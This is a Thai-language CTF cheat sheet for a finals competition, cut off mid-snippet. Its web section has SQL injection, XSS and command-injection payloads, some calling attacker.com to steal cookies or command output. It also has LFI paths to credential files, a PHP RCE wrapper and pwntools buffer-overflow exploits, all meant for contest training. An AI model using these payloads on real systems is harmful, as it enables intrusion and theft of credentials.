# 🚩 CTF Final Cheat Sheet — คู่มือเตรียมรอบชิงชนะเลิศ

> คู่มือฉบับสนามจริง อ่านปุ๊บใช้ปั๊บ ครอบคลุมตั้งแต่มือใหม่ → ระดับใช้งานจริง
> อัปเดต: 15 พฤษภาคม 2569 — สำหรับการแข่งวันที่ 16 พฤษภาคม 2569

---

## 📑 สารบัญ

1. [Quick Links — ลิงก์ที่ต้องเปิดทิ้งไว้](#-quick-links)
2. [Fundamental & Mindset](#-1-fundamental--mindset)
3. [Web Exploitation](#-2-web-exploitation)
4. [Cryptography](#-3-cryptography)
5. [Forensics](#-4-forensics)
6. [Reverse Engineering & Pwn](#-5-reverse-engineering--pwn)
7. [OSINT](#-6-osint)
8. [Miscellaneous](#-7-miscellaneous)
9. [Python Snippets ที่ใช้บ่อย](#-8-python-snippets)
10. [Checklist สุดท้ายก่อนเข้าแข่ง](#-9-pre-game-checklist)

---

## 🔗 Quick Links

| เครื่องมือ | ลิงก์ | ใช้ทำอะไร |
|---|---|---|
| **CyberChef** | https://gchq.github.io/CyberChef/ | มีดพับสวิส encode/decode/crypto |
| **dCode** | https://www.dcode.fr/ | ระบุ cipher อัตโนมัติ + decode |
| **CrackStation** | https://crackstation.net/ | crack hash (MD5/SHA1) |
| **RegExr** | https://regexr.com/ | ทดสอบ regex |
| **JWT.io** | https://jwt.io/ | decode/edit JWT |
| **GTFOBins** | https://gtfobins.github.io/ | escape shell / privilege escalation |
| **RevShells** | https://www.revshells.com/ | สร้าง reverse shell ทุกภาษา |
| **HackTricks** | https://book.hacktricks.xyz/ | ตำราอ้างอิงทุก vector |
| **PayloadsAllTheThings** | https://github.com/swisskyrepo/PayloadsAllTheThings | payload ครบทุกแนว |
| **Decompiler online** | https://godbolt.org/ | compile/decompile ดู assembly |

> 💡 **Trick**: เปิด CyberChef ค้างไว้ทั้งเกม โจทย์ Crypto/Misc 60% จบในนี้

---

## 🧭 1. Fundamental & Mindset

### 1.1 เตรียมเครื่องก่อนแข่ง

**OS ที่แนะนำ:** Kali Linux (หรือ Parrot OS) บน VM/WSL2

```bash
# อัปเดตก่อนแข่ง 1 วัน — อย่าทำตอนแข่ง! เน็ตช้าเสียเวลา
sudo apt update && sudo apt upgrade -y

# ติดตั้ง tool ที่มักหายในเครื่องสด
sudo apt install -y gobuster ffuf nikto sqlmap hydra john hashcat \
  binwalk foremost steghide exiftool zsteg \
  gdb radare2 ltrace strace \
  python3-pip golang nmap netcat-traditional
  
pip3 install pwntools requests beautifulsoup4 pycryptodome
```

**Tools หลักที่ต้องคล่อง:**

| หมวด | Tools |
|---|---|
| Network | `nmap`, `netcat (nc)`, `curl`, `wget` |
| Web | `Burp Suite`, `ffuf`, `gobuster`, `sqlmap`, `nikto` |
| Crypto | `CyberChef`, `openssl`, `python pycryptodome` |
| Forensics | `Wireshark`, `binwalk`, `foremost`, `exiftool`, `steghide`, `zsteg` |
| Rev/Pwn | `Ghidra`, `IDA Free`, `radare2`, `gdb` + `pwndbg`/`gef`, `pwntools` |
| Stego | `stegsolve`, `zsteg`, `stegseek` (สำหรับ steghide brute) |

### 1.2 Mindset ตอนเปิดโจทย์

1. **อ่านชื่อโจทย์และ description ให้ครบ** — มักมี hint ซ่อน เช่น ชื่อ "BabyRSA" → small exponent attack
2. **เช็คไฟล์ก่อนเสมอ** — `file <ไฟล์>`, `strings <ไฟล์>`, `exiftool <ไฟล์>`
3. **ลองง่ายก่อนยาก** — flag อาจอยู่ใน metadata, comment HTML, หรือ `/robots.txt`
4. **Format flag** — มัก fix เช่น `CTF{...}`, `flag{...}` — `grep -r "CTF{" .` บ่อยๆ
5. **อย่าจมโจทย์เดียวเกิน 45 นาที** — skip ไปทำตัวอื่นแล้วค่อยกลับมา

### 1.3 การจัดการเวลา (เกม 6-8 ชม.)

| ช่วงเวลา | ทำอะไร |
|---|---|
| 0–15 นาที | สแกนโจทย์ทั้งหมด แบ่งตามหมวด/ความถนัด |
| 15–60 นาที | เก็บ "ของง่าย" ทุกหมวด (warm-up, baby-*) |
| 1–4 ชม. | โจทย์กลาง — เน้นที่ทีมถนัด |
| 4 ชม.–จบ | โจทย์ยาก / โจทย์ที่เหลือ + ทบทวน flag ที่ submit |
| 30 นาทีสุดท้าย | **หยุดเริ่มของใหม่** ตรวจ flag ที่ผิดและพยายามแก้ |

### ⚠️ จุดที่มือใหม่พลาดบ่อย

- ลืม submit flag ก่อนหมดเวลา (เขียนใน editor แต่ไม่กดส่ง)
- ตอบ flag โดยมี `\n` หรือ space ติดท้าย
- ใช้ผิด format (`CTF{...}` vs `ctf{...}`)
- ไม่บันทึก IP/credentials ของ server → server reset แล้วเริ่มใหม่
- เปิดหลาย instance พร้อมกัน แล้วใช้ session ผิดอัน

---

## 🌐 2. Web Exploitation

### 2.1 Recon ก่อนเสมอ

```bash
# เช็ค headers, cookies, redirects
curl -I https://target.com
curl -v https://target.com

# ดูไฟล์ที่ผู้สร้างมักลืม
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/.git/config
curl https://target.com/.env

# Directory brute force
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt

# View source — กด Ctrl+U เสมอ flag ชอบอยู่ใน HTML comment
```

**Checklist หน้าเว็บใหม่:**
- [ ] View Source (Ctrl+U) — หา comment `<!-- ... -->`
- [ ] DevTools → Network → ดู request/response headers
- [ ] DevTools → Application → Cookies, LocalStorage
- [ ] `/robots.txt`, `/.git/`, `/admin`, `/api`
- [ ] ลอง HTTP methods อื่น: `OPTIONS`, `PUT`, `DELETE`

### 2.2 SQL Injection (SQLi)

**Quick test payloads:**
```sql
'                       -- ทำให้เว็บ error
' OR '1'='1             -- bypass login พื้นฐาน
' OR 1=1--              -- comment ตัด query ที่เหลือ
admin'--                -- bypass ด้วย username
" OR ""="               -- ถ้าใช้ double quote
') OR ('1'='1           -- ถ้ามี parenthesis
```

**UNION-based — หาจำนวนคอลัมน์:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--          -- เพิ่มจน error
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--  -- หาว่าคอลัมน์ไหนแสดงผล
```

**ดึงข้อมูล MySQL:**
```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
```

**ใช้ sqlmap (อย่าลืมขออนุญาตในสนามแข่ง — ส่วนใหญ่ใช้ได้):**
```bash
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --dbs   # ใช้ request file จาก Burp
```

| Cheat | Payload |
|---|---|
| Login bypass | `' OR 1=1-- -` (มี space หลัง `--`) |
| ดูเวอร์ชัน | `' UNION SELECT @@version,2,3-- ` |
| Time-based blind | `'; IF(1=1) WAITFOR DELAY '0:0:5'--` (MSSQL) |
| Sleep blind | `' AND SLEEP(5)-- ` (MySQL) |

### 2.3 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>          <!-- หลุดจาก attribute -->
javascript:alert(1)                   <!-- ใน href -->

<!-- ขโมย cookie ส่งกลับ server เรา -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="this.src='https://attacker.com/?c='+document.cookie">
```

**Bypass filter:**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>   <!-- recursive strip -->
<ScRiPt>alert(1)</ScRiPt>                    <!-- case -->
<img src=x onerror=alert`1`>                 <!-- ไม่ใช้ () -->
<svg/onload=alert(1)>                        <!-- ไม่ใช้ space -->
```

### 2.4 Command Injection

**Operator ที่ใช้แทรกคำสั่ง:**
```bash
; ls                    # รัน 2 คำสั่งต่อกัน
| ls                    # pipe
|| ls                   # รันถ้าคำสั่งแรก fail
&& ls                   # รันถ้าคำสั่งแรก success
& ls                    # background (Windows)
`ls`                    # backtick — command substitution
$(ls)                   # command substitution
%0als                   # URL-encoded newline
```

**Payload สำเร็จรูป:**
```
; cat /etc/passwd
; ls -la /
| whoami
$(curl http://attacker.com/$(id))
; cat /flag.txt
```

**ถ้า space ถูก block:**
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
```

### 2.5 IDOR (Insecure Direct Object Reference)

หลักการ: เปลี่ยน ID ใน URL หรือ body แล้วเข้าถึงของคนอื่นได้

```
https://target.com/profile?id=1234        # ลองเปลี่ยน 1233, 1235
https://target.com/api/orders/1001        # เปลี่ยนเลข
https://target.com/file?name=../admin     # path traversal ผสม
```

**Trick:** ดู `id` ของตัวเอง แล้ว `+1`, `-1`, หรือ `0` มัก hit admin

### 2.6 File Inclusion (LFI/RFI)

**LFI พื้นฐาน:**
```
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00          # null byte (PHP เก่า)
?file=....//....//....//etc/passwd       # bypass strip ../
?file=/etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
```

**File ที่ควรลองอ่าน:**
```
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log              # log poisoning → RCE
/var/www/html/config.php
~/.ssh/id_rsa
~/.bash_history
```

**PHP wrapper สำคัญ:**
```
php://filter/convert.base64-encode/resource=index.php   # อ่าน source PHP
data://text/plain,<?php system($_GET['c']); ?>          # RCE ถ้า allow_url_include
expect://id                                              # ถ้ามี expect extension
```

### 2.7 Web Cheat Sheet สรุป

| Vuln | Test Payload | Tool |
|---|---|---|
| SQLi | `' OR 1=1--` | sqlmap |
| XSS | `<script>alert(1)</script>` | manual + Burp |
| Cmd Inj | `; id` หรือ `\| id` | manual |
| LFI | `../../../etc/passwd` | manual |
| RFI | `?file=http://attacker/shell.txt` | python -m http.server |
| IDOR | เปลี่ยนเลข ID | Burp Repeater |
| SSRF | `?url=http://127.0.0.1:80/` | manual |
| XXE | `<!ENTITY x SYSTEM "file:///etc/passwd">` | manual |
| Open Redirect | `?next=//attacker.com` | manual |

### ⚠️ Web — จุดที่มือใหม่พลาด

- ลืมเช็ค **HTTP method อื่น** (PUT/PATCH/DELETE)
- ลืมเช็ค **comment ใน HTML/JS**
- ส่ง payload ใน URL แต่ลืม **URL-encode** ตัวพิเศษ
- ลืมว่า cookie มี `HttpOnly`/`Secure` — ส่งผ่าน JS ไม่ได้
- ทำ SQLi แล้ว query เป็น INTEGER → ไม่ต้องใช้ `'` ครอบ

---

## 🔐 3. Cryptography

### 3.1 แยกประเภท Cipher จากรูป

| รูปแบบที่เห็น | น่าจะเป็น |
|---|---|
| ตัวอักษร A-Z, =, + ลงท้ายด้วย `=` หรือ `==` | **Base64** |
| 0-9, a-f ความยาวคู่ | **Hex** |
| 0-9, a-z ความยาว 32 ตัว | **MD5** |
| ความยาว 40 ตัว hex | **SHA1** |
| ความยาว 64 ตัว hex | **SHA256** |
| `$2a$`, `$2b$`, `$2y$` | **bcrypt** |
| A-Z, =, ความยาวเป็น 8 ของ | **Base32** |
| มีแต่ `.` และ `-` | **Morse Code** |
| 01010100 | **Binary** |
| ตัวอักษรเลื่อน เช่น "Khoor" → "Hello" | **Caesar/ROT** |
| ตัวเลขเป็น pair เช่น "0807" | **A1Z26** หรือ **Polybius** |
| มี `🔒🔑🗝️` หรือ emoji แปลกๆ | **emoji cipher** |
| `Ook. Ook? Ook!` | **Ook!/Brainfuck** |
| `++++[->++++<]>.` | **Brainfuck** |

> 💡 **Trick**: ใช้ **dCode.fr** หรือ CyberChef "Magic" operation ช่วย identify

### 3.2 Encoding/Decoding พื้นฐาน

**Base64:**
```bash
# Encode
echo -n "hello" | base64           # aGVsbG8=

# Decode
echo "aGVsbG8=" | base64 -d
```

**Hex:**
```bash
echo -n "hello" | xxd -p           # 68656c6c6f
echo "68656c6c6f" | xxd -r -p

# Python
"hello".encode().hex()
bytes.fromhex("68656c6c6f").decode()
```

**ROT13 / Caesar:**
```bash
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'    # ROT13 → Hello

# Caesar brute force (Python)
text = "Khoor"
for k in range(26):
    print(k, ''.join(chr((ord(c)-65-k)%26+65) if c.isupper() else 
                     chr((ord(c)-97-k)%26+97) if c.islower() else c for c in text))
```

**XOR:**
```python
# Single-byte XOR
ct = bytes.fromhex("...")
for key in range(256):
    pt = bytes([b ^ key for b in ct])
    if b"CTF" in pt or b"flag" in pt:
        print(key, pt)

# XOR สองสาย
a = bytes.fromhex("...")
b = bytes.fromhex("...")
print(bytes(x^y for x,y in zip(a,b)))
```

### 3.3 RSA Attacks

**ตรวจสอบก่อน:** มีค่า `n`, `e`, `c` (ciphertext) ครบมั้ย?

**Case 1: e เล็ก (e=3) และ message สั้น** → cube root
```python
from gmpy2 import iroot
m, _ = iroot(c, 3)
print(bytes.fromhex(hex(m)[2:]))
```

**Case 2: n เล็ก** → factor ด้วย FactorDB
```bash
# เปิด http://factordb.com/ แล้ว paste n
# ได้ p, q มา → คำนวณ d
```

**Case 3: p, q ใกล้กัน** → Fermat factorization
```python
from gmpy2 import isqrt
def fermat(n):
    a = isqrt(n) + 1
    while True:
        b2 = a*a - n
        b, exact = isqrt(b2), isqrt(b2)**2 == b2
        if exact: return (a-b, a+b)
        a += 1
```

**Case 4: Wiener attack** (e ใหญ่มาก, d เล็ก) → ใช้ `RsaCtfTool`
```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
python3 RsaCtfTool.py -n N -e E --uncipher CIPHERTEXT
```

**คำนวณ RSA ปกติ (มี p, q):**
```python
from Crypto.Util.number import inverse, long_to_bytes
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, p*q)
print(long_to_bytes(m))
```

### 3.4 AES

**โหมดที่เจอบ่อย:** ECB, CBC, CTR, GCM

**Trick สำคัญ — ECB เห็น pattern:**
```
ถ้าเข้ารหัสรูป BMP ด้วย ECB → ยังเห็นภาพอยู่ (Tux meme)
ถ้า plaintext เดียวกัน → ciphertext block เดียวกัน
```

**Padding Oracle Attack (CBC):** ใช้ `padbuster` หรือเขียนเอง
```bash
padbuster URL "ENCRYPTED_DATA" 16 -cookies "auth=ENCRYPTED_DATA"
```

**Decode AES ปกติ (Python):**
```python
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = cipher.decrypt(ct)
# unpad
from Crypto.Util.Padding import unpad
print(unpad(pt, 16))
```

### 3.5 Crypto Cheat Sheet

| Cipher | Tool/Command |
|---|---|
| Base64 | `base64 -d` / CyberChef |
| Hex | `xxd -r -p` |
| ROT13 | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| ROT-n | CyberChef "ROT13" → set amount |
| Caesar | dCode brute / Python loop |
| Vigenere | dCode.fr (มีตัว auto-find key) |
| Hash crack | `john`, `hashcat`, CrackStation |
| RSA general | RsaCtfTool |
| AES | pycryptodome |
| Morse | CyberChef "From Morse Code" |
| Brainfuck | dcode.fr/brainfuck-language |

### ⚠️ Crypto — จุดที่มือใหม่พลาด

- เห็น Base64 ปุ๊บถอดเลย — ลืมว่า **Base64 ซ้อน 3-4 ชั้น** ได้
- ลืม `-n` ใน `echo -n` → มี `\n` ปะปนทำให้ผลเพี้ยน
- ใช้ `echo "..." | base64 -d` แล้ว pipe ตัด `=` ออก → decode พัง
- คำนวณ RSA แล้ว `bytes.fromhex(hex(m)[2:])` แต่ hex length เป็นเลขคี่ → padding `0`

---

## 🔍 4. Forensics

### 4.1 ขั้นตอนการวิเคราะห์ไฟล์ทุกประเภท

```bash
# Step 1 — เช็คชนิดไฟล์จริง (ไม่ใช่นามสกุล!)
file suspicious.png

# Step 2 — ดู metadata
exiftool suspicious.png

# Step 3 — หา string ที่อ่านได้
strings suspicious.png | grep -i "flag\|ctf"
strings -e l suspicious.png    # 16-bit little-endian (Unicode)

# Step 4 — แกะไฟล์ฝังใน
binwalk suspicious.png
binwalk -e suspicious.png      # extract
foremost suspicious.png        # carve files

# Step 5 — ดู hex dump
xxd suspicious.png | less
hexdump -C suspicious.png | head
```

### 4.2 Steganography (Image)

**PNG/BMP:**
```bash
# zsteg เก่งสุดสำหรับ PNG/BMP
zsteg suspicious.png
zsteg -a suspicious.png         # ทุก option

# Stegsolve — GUI ดู LSB, color planes
java -jar stegsolve.jar
```

**JPEG:**
```bash
# steghide (ต้องรู้ passphrase)
steghide extract -sf image.jpg

# steghide brute (ใช้ stegseek)
stegseek image.jpg /usr/share/wordlists/rockyou.txt

# stegoVeritas — all-in-one
stegoveritas image.jpg
```

**Audio (WAV/MP3):**
```bash
# ดู spectrogram — flag มักซ่อนใน spectrogram
sonic-visualiser audio.wav     # GUI
# หรือใช้ Audacity → Spectrogram view

# LSB ใน audio
python3 -c "
import wave
w = wave.open('audio.wav', 'rb')
frames = w.readframes(w.getnframes())
bits = ''.join(str(b & 1) for b in frames)
print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8))[:200])
"
```

### 4.3 Network Forensics (Wireshark)

**คำสั่งกรอง (filter) ที่ใช้บ่อย:**
```
http                                    # เฉพาะ HTTP
http.request.method == "POST"           # POST requests
http contains "flag"                    # มีคำว่า flag
ip.addr == 192.168.1.1                  # IP ระบุ
tcp.port == 80                          # port
dns                                     # DNS queries
ftp || ftp-data                         # FTP
tcp.stream eq 0                         # stream แรก
```

**Trick สนามแข่ง:**
- File → Export Objects → HTTP/SMB/IMF (email) → ดูไฟล์ที่ถูกส่ง
- Right-click packet → Follow → TCP/HTTP/UDP Stream
- Statistics → Conversations → ดู host ที่คุยกันเยอะที่สุด
- Statistics → Protocol Hierarchy → ดูสัดส่วน protocol

**tshark (CLI) — เร็วกว่าตอน file ใหญ่:**
```bash
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap --export-objects "http,/tmp/files"
```

### 4.4 Metadata & Misc

```bash
# Image metadata
exiftool image.jpg
identify -verbose image.jpg

# PDF
pdfinfo document.pdf
pdfimages -all document.pdf out
pdf-parser document.pdf

# Office files (docx/xlsx) เป็น zip
unzip -l document.docx
unzip document.docx -d extracted/
# ดู document.xml, media/
```

### 4.5 Forensics Cheat Sheet

| ประเภท | Tool หลัก | Tool รอง |
|---|---|---|
| Image stego | `zsteg`, `steghide`, `stegsolve` | `stegoveritas`, `stegseek` |
| PCAP | `Wireshark`, `tshark` | `NetworkMiner` |
| Memory dump | `volatility3` | `volatility` (v2) |
| Disk image | `autopsy`, `sleuthkit` | `testdisk`, `photorec` |
| Metadata | `exiftool` | `identify` |
| File carving | `binwalk -e`, `foremost` | `scalpel` |
| Hex view | `xxd`, `hexdump -C` | `010 Editor`, `HxD` |

### ⚠️ Forensics — จุดที่มือใหม่พลาด

- เชื่อนามสกุลไฟล์ (.png แต่จริงเป็น zip) — เช็คด้วย `file` เสมอ
- `strings` แต่ลืมใช้ `-e l` หรือ `-e b` สำหรับ unicode
- ลืมว่าไฟล์อาจมี **ไฟล์ซ้อนต่อท้าย** (PNG + zip = polyglot) → `binwalk`
- ดู spectrogram แต่ตั้ง scale ผิด → มองไม่เห็น flag

---

## ⚙️ 5. Reverse Engineering & Pwn

### 5.1 First Look — ดูไฟล์ binary

```bash
# ดูชนิด architecture, static/dynamic
file program

# ดู security mitigations
checksec --file=program
# จะเห็น: NX, PIE, Canary, RELRO

# strings — flag มักโผล่ทันที!
strings program | grep -i "flag\|ctf\|pass"
strings program | less

# ดู library ที่ link
ldd program

# Trace
ltrace ./program        # library calls (strcmp มัก leak flag!)
strace ./program        # system calls
```

> 💡 **Top Trick**: โจทย์ Rev ระดับเริ่มต้น 50% แก้ได้ด้วยแค่ `strings` หรือ `ltrace`

### 5.2 Assembly เบื้องต้น (x86-64)

| Instruction | ความหมาย |
|---|---|
| `mov rax, rbx` | rax = rbx |
| `add rax, 5` | rax += 5 |
| `cmp rax, rbx` | เทียบ ตั้ง flag (ไม่เก็บผล) |
| `je label` | jump if equal (zero flag = 1) |
| `jne label` | jump if not equal |
| `jg / jl` | jump if greater/less |
| `call func` | push return addr, jmp |
| `ret` | pop rip — กลับจาก function |
| `push rax` | rsp -= 8; *rsp = rax |
| `pop rax` | rax = *rsp; rsp += 8 |
| `lea rax, [rbp-8]` | rax = address of var |
| `xor rax, rax` | set rax = 0 (ประหยัด bytes) |

**Register convention (System V x86-64):**
- Args: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` (ตามลำดับ)
- Return: `rax`
- Stack pointer: `rsp` / Frame pointer: `rbp`

### 5.3 Ghidra Workflow (แนะนำสำหรับมือใหม่)

1. File → New Project → Import file
2. Double-click ไฟล์ → Analyze (กด OK ใช้ default)
3. Symbol Tree → Functions → หา `main`
4. ดูหน้าต่าง Decompiler ทางขวา (กึ่ง C)
5. กด `L` เพื่อ rename variables ให้อ่านง่าย
6. ดับเบิ้ลคลิกชื่อ function เพื่อไป function อื่น

**Shortcut:**
- `G` — Go to address
- `L` — Rename label
- `Ctrl+Shift+E` — Edit function signature
- `;` — เพิ่ม comment

### 5.4 Pwn — Buffer Overflow เบื้องต้น

**ขั้นตอนมาตรฐาน:**

```bash
# 1. ดู mitigation
checksec --file=./vuln
# ถ้า NX disabled → shellcode ได้
# ถ้า Canary disabled → BOF ตรงๆ ได้
# ถ้า PIE disabled → address fix

# 2. หา offset (จุดที่ overwrite RIP)
# สร้าง pattern
python3 -c "from pwn import *; print(cyclic(200))" 
# รันใน gdb แล้ว crash → ดู RIP value
# คำนวณ offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
```

**Simple ret2win (มี function `win()` อยู่แล้ว):**

```python
from pwn import *

p = process('./vuln')
# p = remote('chal.ctf.com', 1337)

elf = ELF('./vuln')
win_addr = elf.symbols['win']

offset = 72  # หาด้วย cyclic
payload = b'A' * offset
payload += p64(0x401016)        # ret gadget (stack alignment)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

**ret2libc (NX enabled, ไม่มี win):**

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = elf.libc

# Leak libc address ผ่าน puts
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])     # กลับ main เพื่อโจมตีอีกรอบ

payload = b'A' * offset + rop.chain()
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# รอบสองยิง system("/bin/sh")
rop2 = ROP(libc)
rop2.raw(rop.find_gadget(['ret'])[0])  # alignment
rop2.system(next(libc.search(b'/bin/sh')))

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
```

### 5.5 Format String

โค้ดเปราะ:
```c
printf(user_input);   // bug!
```

Test:
```
%p %p %p %p %p           # leak stack
%s                       # อ่าน string ที่ stack pointer ชี้
%7$p                     # leak argument ที่ 7
%n                       # เขียน → arbitrary write
```

### 5.6 Rev/Pwn Cheat Sheet

| งาน | คำสั่ง |
|---|---|
| Identify binary | `file`, `checksec` |
| String hunt | `strings -a`, `strings -e l` |
| Trace calls | `ltrace`, `strace` |
| Decompile | Ghidra, IDA Free, `radare2 -A` then `pdg` (with r2ghidra) |
| Debug | `gdb`, `pwndbg`/`gef` |
| Find offset | `pwn cyclic 200`, `pwn cyclic -l 0xXXX` |
| Build exploit | `pwntools` (Python) |
| Find gadgets | `ROPgadget --binary ./vuln`, `ropper -f ./vuln` |

### ⚠️ Rev/Pwn — จุดที่มือใหม่พลาด

- ลืม `checksec` ก่อน → เสียเวลาทำ exploit ผิดทาง
- หา offset ผิดเพราะ `\n` ของ `print` ทำ payload เพิ้ยน → ใช้ `sys.stdout.buffer.write`
- `p64()` กับ `p32()` ใช้ผิดสถาปัตยกรรม
- ลืม stack alignment (ต้อง add `ret` gadget อีกตัวก่อน `system`)

---

## 🕵️ 6. OSINT

### 6.1 Google Dorks

```
site:target.com                          # เฉพาะ domain นั้น
site:target.com -www                     # ตัด www ออก
intitle:"index of" "parent directory"    # listing เปิด
inurl:admin                              # url มี admin
filetype:pdf site:target.com             # pdf ใน site
"keyword" site:github.com                # หา leak ใน GitHub
site:pastebin.com "target.com"           # leak ใน pastebin
ext:env "DB_PASSWORD"                    # .env เปิด
cache:target.com                         # Google cache
```

### 6.2 หาคนจากรูป/Username

| ใช้ | เครื่องมือ |
|---|---|
| Reverse image search | Google Images, Yandex Images (เก่งสุด!), TinEye |
| Username ในทุก platform | `sherlock`, https://whatsmyname.app |
| Email → ที่ leak | https://haveibeenpwned.com |
| Email → social | https://epieos.com |
| Phone → ข้อมูล | https://numverify.com |
| Domain WHOIS | `whois target.com`, https://whoisology.com |
| Subdomain | `subfinder -d target.com`, https://crt.sh |
| GitHub user | https://github.com/search?type=commits |

### 6.3 ภาพถ่าย → สถานที่

1. **EXIF** มี GPS หรือไม่? `exiftool -gps* image.jpg`
2. ดู **ป้ายภาษา/ทะเบียนรถ/ธง** → ตัดประเทศได้
3. ดู **เสาไฟ, ตู้ไปรษณีย์, แท็กซี่** → แต่ละประเทศเอกลักษณ์ต่างกัน
4. **ตรวจเงา** → คำนวณทิศและช่วงเวลา
5. ใช้ **Google Street View** บริเวณที่สงสัย
6. Yandex reverse search → ดีกว่า Google สำหรับ landmark

### 6.4 Social Media Recon

- **Twitter/X**: `from:username since:2024-01-01 until:2024-12-31`
- **Facebook**: เปลี่ยน `/profile.php?id=` เป็น `/profile.php?id=` แล้วเปิดดู graph (จำกัดมากแล้ว)
- **Instagram**: `https://www.instagram.com/<username>/?__a=1` (เคยใช้, ปัจจุบันจำกัด)
- **LinkedIn**: หาเพื่อนร่วมงาน บริษัทเก่า

### ⚠️ OSINT — จุดที่มือใหม่พลาด

- ใช้ Google อย่างเดียว — ลืมว่า **Yandex** เก่งกว่าใน reverse image
- ลืมเช็ค **archive.org** (Wayback Machine) สำหรับเว็บที่ลบไปแล้ว
- ค้นหาเป็นภาษาอังกฤษอย่างเดียว — โจทย์ไทยลองค้นภาษาไทยด้วย

---

## 🎁 7. Miscellaneous

### 7.1 File Signatures (Magic Bytes)

| ชนิด | Magic bytes (hex) | ASCII |
|---|---|---|
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| JPEG | `FF D8 FF` | ÿØÿ |
| GIF | `47 49 46 38` | `GIF8` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |
| RAR | `52 61 72 21` | `Rar!` |
| 7z | `37 7A BC AF 27 1C` | `7z...` |
| ELF | `7F 45 4C 46` | `.ELF` |
| Windows PE | `4D 5A` | `MZ` |
| Class (Java) | `CA FE BA BE` | |
| MP3 (ID3) | `49 44 33` | `ID3` |
| WAV | `52 49 46 46` | `RIFF` |
| MP4 | `00 00 00 .. 66 74 79 70` | `....ftyp` |
| SQLite | `53 51 4C 69 74 65` | `SQLite` |
| BMP | `42 4D` | `BM` |

**ซ่อมไฟล์ที่ header เสีย:**
```bash
# ใช้ hex editor (ghex, bless, HxD) แก้ byte แรก
# หรือ:
printf '\x89PNG\r\n\x1a\n' > new.png
dd if=broken.png bs=1 skip=8 >> new.png
```

### 7.2 QR Code / Barcode

```bash
# Decode QR จากรูป
zbarimg qrcode.png

# ถ้า QR เสีย/ครึ่งหนึ่ง → ลอง https://merri.cx/qrazybox/
```

### 7.3 Esoteric Languages

| Language | Looks like | Decoder |
|---|---|---|
| Brainfuck | `++>+++[-<+>]<.` | dCode, https://copy.sh/brainfuck/ |
| Whitespace | (มีแต่ space/tab) | https://vii5ard.github.io/whitespace/ |
| Piet | image art | https://www.bertnase.de/npiet/npiet-execute.php |
| Malbolge | random ASCII | dCode |
| Ook! | `Ook. Ook? Ook!` | dCode |

### 7.4 Misc Cheat Sheet

| งาน | คำสั่ง |
|---|---|
| QR decode | `zbarimg file.png` |
| Barcode decode | `zbarimg`, online tool |
| ZIP password crack | `fcrackzip -D -p rockyou.txt file.zip` |
| RAR password | `john --format=rar5 hash.txt` |
| PDF password | `pdfcrack -f file.pdf -w rockyou.txt` |
| Office password | `office2john file.docx > hash; john hash` |

---

## 🐍 8. Python Snippets

> 💾 เก็บ snippets เหล่านี้ในโฟลเดอร์ `scripts/` ใน GitHub repo ของคุณ

### 8.1 HTTP Request Loop

```python
import requests
BASE = "https://target.com"
s = requests.Session()
for i in range(1, 1000):
    r = s.get(f"{BASE}/page?id={i}")
    if "flag" in r.text.lower() or r.status_code != 404:
        print(i, r.status_code, len(r.text))
```

### 8.2 Caesar Brute Force

```python
def caesar(text, k):
    out = ""
    for c in text:
        if c.isupper(): out += chr((ord(c)-65+k)%26+65)
        elif c.islower(): out += chr((ord(c)-97+k)%26+97)
        else: out += c
    return out

ct = "Wklv lv d whvw"
for k in range(26):
    print(f"{k:2}: {caesar(ct, -k)}")
```

### 8.3 XOR Brute Force

```python
ct = bytes.fromhex("1a2b3c...")
for key in range(256):
    pt = bytes(b ^ key for b in ct)
    if all(32 <= c <= 126 or c in (9,10,13) for c in pt):
        print(f"Key {key}: {pt}")
```

### 8.4 Multi-byte XOR Key

```python
# ถ้ารู้ key เป็นคำ
from itertools import cycle
ct = bytes.fromhex("...")
key = b"secret"
pt = bytes(c ^ k for c, k in zip(ct, cycle(key)))
print(pt)
```

### 8.5 Base64 Recursive Decode

```python
import base64, re
data = "ZkRGd1IxOXVNRjlpWVhObE5qUmZkMlZmYW5WemRGOWxiblJsY21Wa1gyRWZkR1Z6ZEY5emRISmZNUT09"
while True:
    try:
